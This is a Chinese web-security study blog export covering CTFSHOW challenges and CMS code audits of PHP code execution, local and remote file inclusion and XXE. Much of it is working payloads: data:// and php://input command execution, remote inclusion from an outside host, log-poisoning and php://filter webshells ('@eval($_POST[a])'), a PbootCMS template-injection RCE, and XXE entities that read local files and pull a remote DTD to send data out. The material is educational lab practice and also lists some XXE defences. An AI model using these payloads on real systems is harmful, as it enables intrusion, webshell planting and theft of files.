class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload1:</span><br><span class="line">    <span class="meta">?&gt;</span>代替;进行分割，继续构造新变量</span><br><span class="line">    再搭配data伪协议</span><br><span class="line">    ?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">    <span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">    前期的文件包含漏洞--伪协议都能使用。</span><br></pre></td></tr></table></figure><h3 id="37-39-包含-amp-伪协议-amp-通配符"><a href="#37-39-包含-amp-伪协议-amp-通配符" class="headerlink" title="37~39-包含&amp;伪协议&amp;通配符"></a>37~39-包含&amp;伪协议&amp;通配符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac fla*&#x27;);?&gt;</span></span><br><span class="line">php:<span class="comment">//input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="代码审计-PbootCMS-RCE代码执行"></a>代码审计-PbootCMS-RCE代码执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">代码审计：</span><br><span class="line">    框架源码和常规源码，文件地址和URL是不直接对应的</span><br><span class="line">    后面涉及，当下不涉及</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">流程：搜索特定函数<span class="keyword">eval</span>-&gt;parserIfLabel-&gt;parserCommom-&gt;About&amp;Content-&gt;构造</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern2</span> = <span class="string">&#x27;/pboot:([0-9])+if/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$content</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> ++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$out_html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="comment">// 对于无参数函数不执行解析工作</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\w]+\(\)/&#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 相关输出</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;if(&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, <span class="variable">$matches</span>[<span class="number">2</span>][<span class="variable">$i</span>], <span class="variable">$matches2</span>)) &#123; <span class="comment">// 判断是否存在else</span></span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$flag</span>) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>: <span class="comment">// 条件为真</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$matches2</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                            <span class="variable">$out_html</span> = <span class="variable">$matches2</span>[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>: <span class="comment">// 条件为假</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$matches2</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                            <span class="variable">$out_html</span> = <span class="variable">$matches2</span>[<span class="number">2</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$flag</span> == <span class="string">&#x27;if&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$out_html</span> = <span class="variable">$matches</span>[<span class="number">2</span>][<span class="variable">$i</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 无限极嵌套解析</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern2</span>, <span class="variable">$out_html</span>, <span class="variable">$matches3</span>)) &#123;</span><br><span class="line">                <span class="variable">$out_html</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;pboot:&#x27;</span> . <span class="variable">$matches3</span>[<span class="number">1</span>] . <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;pboot:if&#x27;</span>, <span class="variable">$out_html</span>);</span><br><span class="line">                <span class="variable">$out_html</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$matches3</span>[<span class="number">1</span>] . <span class="string">&#x27;else&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, <span class="variable">$out_html</span>);</span><br><span class="line">                <span class="variable">$out_html</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parserIfLabel</span>(<span class="variable">$out_html</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 执行替换</span></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$matches</span>[<span class="number">0</span>][<span class="variable">$i</span>], <span class="variable">$out_html</span>, <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload:留言内容，再访问about</span><br><span class="line">    AboutController：&#123;pboot:<span class="keyword">if</span>(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#125;!!!&#123;/pboot:<span class="keyword">if</span>&#125;</span><br><span class="line">    ContentController：/index.php/Content/<span class="number">2</span>?keyword=&#123;pboot:<span class="keyword">if</span>(<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]));<span class="comment">//)&#125;)&#125;&#125;&#123;/pboot:if&#125;&amp;1=phpinfo();</span></span><br></pre></td></tr></table></figure><h2 id="层面-探针-语言-amp-CMS框架-amp-中间件"><a href="#层面-探针-语言-amp-CMS框架-amp-中间件" class="headerlink" title="层面-探针-语言&amp;CMS框架&amp;中间件"></a>层面-探针-语言&amp;CMS框架&amp;中间件</h2><p><a href="http://vulfocus.io/">http://vulfocus.io/</a>  Shiro weblogic</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0031-WEB攻防-22-通用漏洞(逻辑漏洞)之文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</title>
      <link href="/2023/07/03/SEC-Study-0059/"/>
      <url>/2023/07/03/SEC-Study-0059/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>过滤功能：<br>1.嵌入式过滤或者单独写一个过滤文件<br>2.过滤文件的代码共享和执行，一旦有变量则存在文件包含漏洞风险<br>3.文件包含意味着执行，能正确执行PHP代码</p><h2 id="核心知识："><a href="#核心知识：" class="headerlink" title="核心知识："></a>核心知识：</h2><ul><li><p>本地包含LFI&amp;远程包含RFI-区别</p><ul><li>一个只能包含本地，一个可以远程加载</li><li>具体形成原因由代码和环境配置文件决定</li></ul></li><li><p>各类脚本语言包含代码写法-见下文</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--<span class="comment">#include file=&quot;1.asp&quot; --&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include file=&quot;top.aspx&quot; --&gt;</span></span><br><span class="line">&lt;c:import url=<span class="string">&quot;http://thief.one/1.jsp&quot;</span>&gt;</span><br><span class="line">&lt;jsp:<span class="keyword">include</span> page=<span class="string">&quot;head.jsp&quot;</span>/&gt;</span><br><span class="line">&lt;%@ <span class="keyword">include</span> file=<span class="string">&quot;head.jsp&quot;</span>%&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&#x27;test.php&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>各类脚本语言包含伪协议玩法</p><ul><li><a href="https://www.cnblogs.com/endust/p/11804767.html">点我</a></li><li><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">php伪协议点我</a><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">点我</a></li><li>见图<br><img src="i1.png"><br><img src="i2.png"></li></ul></li></ul><h2 id="思路要点："><a href="#思路要点：" class="headerlink" title="思路要点："></a>思路要点：</h2><ul><li><p>黑盒发现：</p><ul><li><p>主要观察参数传递的数据和文件名是否对应</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">修改文件名以包含文件</span><br><span class="line">http:<span class="comment">//xx.xxx.xx/xxx.php?x=文件名</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>白盒发现：</p><ul><li>可通过应用功能追踪代码定位审计</li><li>可通过脚本特定函数搜索定位审计</li><li>可通过伪协议玩法绕过相关修复等</li></ul></li></ul><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><h3 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h3><ul><li>有文件的情况：<ul><li>网站有文件、网站能上传：包含网站本身的文件</li></ul></li></ul><blockquote><p>本地包含：LFI   local   file    include<br>包含一个文件，带上后门代码就能getshell=&gt;文件上传到网站目录，利用网站本地执行</p></blockquote><ul><li><p>没文件的时候：</p><ul><li><p>文件不能指定，借助日志写入(UA)和session文件写入把后门代码搞上去.</p><ul><li><p>PHPSESSIONID对session临时文件的命名有控制作用.(全部试验一遍就知道那个有控制作用了)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">条件竞争：使用不及时就把上传的文件删除掉</span><br><span class="line"></span><br><span class="line">session默认保存路径：/tmp或/<span class="keyword">var</span>/lib/php/session或C:\WINDOWS\Temp</span><br><span class="line">session.save_path       <span class="comment">//session文件存储地址</span></span><br><span class="line">session.upload_progress.enabled      <span class="comment">//session文件上传上传</span></span><br><span class="line">session.upload_progress.cleanup     <span class="comment">//定时清空文件</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>伪协议：直接执行代码，相当于直接创建一个后门</p><ul><li>没有文件上传也能进行PHP代码执行</li><li>读、写文件，同时进行编码、算法等。</li><li>缺点：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这种会导致伪协议失效</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;conn/&#x27;</span>.<span class="variable">$file</span>)      </span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;conn/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>)      </span><br></pre></td></tr></table></figure></li></ul></li></ul><blockquote><p>没有漏洞的文件上传，上传后门代码就不能被解析。上传文件只能上传非脚本格式文件，就不能被触发。<br>文件包含不管文件是什么，都当做PHP执行<br>解决办法</p></blockquote><h3 id="师"><a href="#师" class="headerlink" title="师"></a>师</h3><ul><li>有可控文件如能上传文件，配合上传后包含</li><li>无可控文件可以利用日志或Session&amp;伪协议</li><li>代码固定目录及文件后缀时需考虑版本绕过</li><li>伪协议玩法是建立在代码中只有变量存在时</li></ul><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="CTF应用-CTFSHOW-78关卡到117关卡"><a href="#CTF应用-CTFSHOW-78关卡到117关卡" class="headerlink" title="CTF应用-CTFSHOW-78关卡到117关卡"></a>CTF应用-CTFSHOW-78关卡到117关卡</h2><p>打题前提：使用旧渗透版的火狐，好像新版火狐谷歌等都有自带的防护，出不了结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">打开PHP配置</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br><span class="line">=&gt; 允许远程包含的办法</span><br></pre></td></tr></table></figure><h3 id="78-php-amp-http协议"><a href="#78-php-amp-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: ?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">payload: ?file=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.php&#x27;)?&gt;</span></span><br><span class="line">payload: </span><br><span class="line">    ?file=php:<span class="comment">//input </span></span><br><span class="line">    post:</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">payload: </span><br><span class="line">    ?file=http:<span class="comment">//www.xiaodi8.com/1.txt（带外到某个服务器）</span></span><br><span class="line">    <span class="number">1</span>.txt:</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="79-data-amp-http协议"><a href="#79-data-amp-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤掉&quot;php&quot;关键字，将其替换为&quot;???&quot;</span></span><br><span class="line">payload: ?file=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span></span><br><span class="line">payload: ?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">payload: ?file=http:<span class="comment">//www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">禁用远程包含、data</span><br><span class="line"><span class="number">1</span>、利用其他协议,如file,zlib等</span><br><span class="line"><span class="number">2</span>、利用日志记录UA特性包含执行</span><br><span class="line">分析需文件名及带有php关键字放弃</span><br><span class="line">故利用日志记录UA信息，UA带入代码</span><br><span class="line">包含：/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">    ?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">    UA: <span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    x=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl0g.php&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">82</span>~<span class="number">86</span>已损坏</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/lnterpreter/p/14086164.html</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/echoDetected/p/13976405.html</span></span><br></pre></td></tr></table></figure><h3 id="87-php-filter-write-amp-加密编码"><a href="#87-php-filter-write-amp-加密编码" class="headerlink" title="87-php://filter/write&amp;加密编码"></a>87-php://filter/write&amp;加密编码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、利用base64:把后门写进去</span><br><span class="line">base64编码要编码两次</span><br><span class="line">    - 浏览器解码一次，传入后台再解一次</span><br><span class="line">    url编码<span class="number">2</span>次，然后放到?file=的右边：php:<span class="comment">//filter/write=convert.base64-decode/resource=123.php</span></span><br><span class="line">    http:<span class="comment">//xxx.xxx.com/?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30</span></span><br><span class="line">    </span><br><span class="line">    body的内容：content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==</span><br><span class="line">        原意：aa<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、利用凯撒<span class="number">13</span>：</span><br><span class="line">    url编码<span class="number">2</span>次：php:<span class="comment">//filter/write=string.rot13/resource=2.php</span></span><br><span class="line">    content=<span class="meta">&lt;?</span>cuc <span class="title function_ invoke__">riny</span>(<span class="variable">$_CBFG</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="88-data-amp-base64协议"><a href="#88-data-amp-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">过滤PHP，各种符号，php代码编码写出无符号base64值</span><br><span class="line">Payload：</span><br><span class="line">    file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk</span></span><br><span class="line">                                    这里就是加密后的php代码 <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac *.php&#x27;</span>);<span class="keyword">echo</span> <span class="number">123</span>;<span class="meta">?&gt;</span>ad</span><br><span class="line">                                    不能带 <span class="string">&#x27;+&#x27;</span> 和 <span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="117-php-filter-write-amp-新的算法"><a href="#117-php-filter-write-amp-新的算法" class="headerlink" title="117-php://filter/write&amp;新的算法"></a>117-php://filter/write&amp;新的算法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.：一种过滤器，和使用<span class="title function_ invoke__">iconv</span>()函数处理流数据有等同作用</span><br><span class="line"></span><br><span class="line">生成：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过一次反转:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过第二次反转:&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Payload：</span><br><span class="line">    ?file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">    contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br></pre></td></tr></table></figure><h2 id="CMS源码-XHCMS-代码审计-amp-日志-amp-绕过"><a href="#CMS源码-XHCMS-代码审计-amp-日志-amp-绕过" class="headerlink" title="CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h2><p>限制很多。</p><ul><li>搜索特定函数寻包含点(include等包含类漏洞)</li><li>固定目录及后缀名需绕过(无法使用伪协议，前端没有文件上传)</li><li>由CMS无上传用日志包含</li><li>利用长度绕过后缀名固定（低版本PHP可行）<br>Payload：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?r=../../../Apache/logs/access.log/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0030-WEB攻防-21-通用漏洞(逻辑漏洞)之XML/XXE-/无回显/伪协议/DTD实体/代码审计</title>
      <link href="/2023/07/02/SEC-Study-0058/"/>
      <url>/2023/07/02/SEC-Study-0058/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="思路点："><a href="#思路点：" class="headerlink" title="思路点："></a>思路点：</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">参考点我</a></p><ul><li>XXE黑盒发现：<ul><li>获取得到 <strong>Content-Type</strong> 或 <strong>数据类型为xml</strong> 时，尝试进行xml语言payload进行测试</li><li>不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</li><li>XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</li></ul></li><li>XXE白盒发现：(前两点针对了大部分漏洞，但不能针对CSRF漏洞)<ul><li>可通过 <strong>应用功能</strong> 追踪代码定位审计</li><li>可通过脚本 <strong>特定函数</strong> 搜索定位审计</li><li>可通过 <strong>伪协议玩法</strong> 绕过相关修复等</li></ul></li></ul><blockquote><p>流程：<br>客户端xml发送数据<br>服务器xml解析数据</p><p>攻击方式：插入xml文件读取代码</p><p>白盒测试：查xml的操作函数和解析函数（比如PHP的）<br>靠运气查XML在代码当中的位置：查注释</p></blockquote><h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="XML-与-HTML-的主要差异："><a href="#XML-与-HTML-的主要差异：" class="headerlink" title="XML 与 HTML 的主要差异："></a>XML 与 HTML 的主要差异：</h3><ul><li>XML 被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观。</li><li>HTML 旨在显示信息 ，而 XML 旨在传输信息。</li></ul><h3 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h3><ul><li><p>方案1-禁用外部实体</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP:</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">#JAVA:</span></span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.<span class="title function_ invoke__">newInstance</span>();dbf.<span class="title function_ invoke__">setExpandEntityReferences</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">#Python：</span></span><br><span class="line"><span class="keyword">from</span> lxml import etreexmlData = etree.<span class="title function_ invoke__">parse</span>(xmlSource,etree.<span class="title function_ invoke__">XMLParser</span>(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p>方案2-过滤用户提交的XML数据</p><ul><li>过滤关键词：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</span><br></pre></td></tr></table></figure></li></ul><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="XML-amp-XXE-黑盒-原理-amp-探针-amp-利用-amp-玩法等"><a href="#XML-amp-XXE-黑盒-原理-amp-探针-amp-利用-amp-玩法等" class="headerlink" title="XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等"></a>XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">参考点我</a><br><a href="https://blog.csdn.net/treblez/article/details/102069499">dtd语法</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、读取文件：</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM  <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"><span class="number">1.1</span>、带外测试：测试漏洞是否存在</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM <span class="string">&quot;http://9v57ll.dnslog.cn&quot;</span>&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、外部引用实体dtd：（无/有 回显的外部实体）</span><br><span class="line"> - 解决拦截防护问题</span><br><span class="line"> - 解决数据不回显问题</span><br><span class="line"></span><br><span class="line">使用</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    <span class="comment">// # 引用远程的dtd文件</span></span><br><span class="line">    &lt;!ENTITY % file SYSTEM <span class="string">&quot;http://127.0.0.1:8081/evil2.dtd&quot;</span>&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br><span class="line">远程dtd文件内容：evil2.dtd =&gt; 读取D盘的e.txt</span><br><span class="line">&lt;!ENTITY send SYSTEM <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、无回显读文件</span><br><span class="line">需要准备test.dtd和get.php</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 读取文件并且读取远程dtd</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span 